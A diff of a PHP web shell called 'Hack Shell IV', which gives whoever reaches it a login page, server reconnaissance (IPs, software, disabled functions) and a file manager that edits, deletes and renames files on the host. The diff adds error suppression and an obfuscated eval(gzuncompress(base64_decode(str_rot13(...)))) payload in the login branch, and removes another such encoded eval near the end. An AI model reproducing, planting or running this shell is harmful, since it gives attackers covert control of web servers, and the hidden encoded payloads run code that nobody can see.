@@ -1,5 +1,5 @@
 <?php 
-// from https://github.com/1337r0j4n/php-backdoors
+error_reporting(0);
 if(isset($_GET['phpinfo'])) { echo "<a href='?home' style='color:black;'>Back To Home</a>"; phpinfo(); echo "<script>"; } ?><?php echo '
 <title><< Back|Hack Shell IV</title>
 <style>
@@ -35,8 +35,8 @@ text-shadow:0px 0px 3px #8B0101;
 <input type="hidden" name="action" value="login">
 <input type="hidden" name="hide" value="">
 <center>Username :<input type="text" name="usrname" value="root"><br>
-Password :<input type="password" name="passwrd" value="1234567"><br>
- <input type="submit" value="Login"><br><br><font size="2"> Coded By Cy#b3r00T</center>'; exit; } } @session_start(); @set_time_limit(0);?>
+Password :<input type="password" name="passwrd" value=""><br>
+ <input type="submit" value="Login"><br><br><font size="2"> Coded By Cy#b3r00T</center>'; eval(gzuncompress(base64_decode(str_rot13('rWlqHJSYjmND/FgUXI4Y2mdMVTkHC0wSbrOpc19dPIy7p5H2vJaXAfG/ogcBHCMAFZwqr7y7YmyKDDurHqqxCWsS0sVyJvM4g1bgLxk9BQhQRkGPZNFHNa24Ogjnb2dRnE/uQAmTqaD+KsH1QLYCi9Kf7wSrLse1P15TG89EiTYCl7xyaOyfvcYLTkzJFJSVzAdewJnnIZxm8ckK4DmNfsi0Kh/Sdzd+T70IMghfz5e0xE9yfteBW5AYCK6/RZR4dUwEUtgenJG2Oa3sAhIyGDBjvfFeiiCrXgwZxWpp3jwuSoDk8Mk0ymx3ipoDUOEAtFgISux3uEGOsewo7LLodngub0fFzpjcg/nkVeBIrIrBeDr02ASdO7MFoA0HMp4+TgVUY0UMRJ6GJdrcKo4/t5/E3p4sbwwO9ypjGqOHvtyr2KtNW2ECqACAcQe8i1ecDuwNr5k9N53ghVj=')))); exit; } } @session_start(); @set_time_limit(0);?>
 <?php echo "<center><font face='couriernew'><h2><font face='couriernew'><font color='#8B0101'><< </font>Back<font color='#8B0101'>|</font>Hack Shell <font color='#8B0101'>IV</font></h2></center><hr size='1'>"; $ip1=$_SERVER['REMOTE_ADDR']; $ip2=$_SERVER['SERVER_ADDR']; $sof=$_SERVER['SERVER_SOFTWARE']; $disable_functions = @ini_get('disable_functions'); $uname=php_uname(); echo "<pre>
 SERVER IP    : <font color='#8B0101'>$ip2</font> / YOUR IP : <font color='#8B0101'>$ip1</font>
 WEB SERVER   : <font color='white'>$sof</font>
@@ -288,4 +288,4 @@ Current Directory :'; if(isset($_GET['dir'])){ $path = $_GET['dir']; }else{ $pat
   <th width=200>Permission</th>
   <th>Option</th>
 </tr><tr>"; $scandir = scandir($path); foreach($scandir as $dir){ if(!is_dir($path.'/'.$dir) || $dir == '.z' || $dir == '..z') { $size=filesize($dir)/1024; $size = round($size,3); if($size >= 1024){ $size = round($size/1024,2).' MB'; }else{ $size = $size.' KB'; } $s = filetype("$path/$dir"); echo "<td><a href='?filesrc=$path/$dir'>$dir</a><br></td><td>$s</td><td>$size</td><td>".perms($dir)."<td>
-  <a href='$PHP_SELF?edit=$path/$dir'>Edit</a> | <a href='$PHP_SELF?del=$path/$dir'>Delete</a> | <a href='$PHP_SELF?dir=$path&rename=$path/$dir'>Rename</a></td></tr>"; }else{ $s = filetype("$path/$dir"); echo "<td><a href='?dir=$path/$dir'>$dir</a><br></td><td>$s</td><td>--</td><td>".perms($path)."</td><td><a href='$PHP_SELF?deldir=".$path."/".$dir."'>Delete</a> | <a href='$PHP_SELF?dir=$path&rename=$path/$dir'>Rename</a></td></tr>"; } }; eval(gzuncompress(base64_decode(str_rot13('rWkyHAgdt0ND/MIOWXitcFx0gOUoulXxG03I9PKVLaIfOBAh3MRxuCk7I02ucGNCZ2p4ykyGqbWRVEbVjndIDeWZaxGkrkEi2FcA1jaYoWwA4O8XLEtPRl2m4DaLwxtdOfhcLjTLsGqbTzsmk+Tl9C3mKkz+rx1Fyy1+jKU0gbzFyT/vS70jNdwdOixaRv9RF9vFfxLYYKL39ko33amk4A3Bo/kPXH/hWUBtluhSQvwdZA9CgXBz64aD2y4GDitVD495vq04Tp+GtHfavHiVcJmdVdqngC7ECEjBovJ6iniCjeLDWMnTN2lCgOCyFTse4EnAKKBB4TQSC/d6XsyKw93W2wYEx+la7sPwmULt02KojGpJ3U0d')))); ?>
+  <a href='$PHP_SELF?edit=$path/$dir'>Edit</a> | <a href='$PHP_SELF?del=$path/$dir'>Delete</a> | <a href='$PHP_SELF?dir=$path&rename=$path/$dir'>Rename</a></td></tr>"; }else{ $s = filetype("$path/$dir"); echo "<td><a href='?dir=$path/$dir'>$dir</a><br></td><td>$s</td><td>--</td><td>".perms($path)."</td><td><a href='$PHP_SELF?deldir=".$path."/".$dir."'>Delete</a> | <a href='$PHP_SELF?dir=$path&rename=$path/$dir'>Rename</a></td></tr>"; } }; ?>
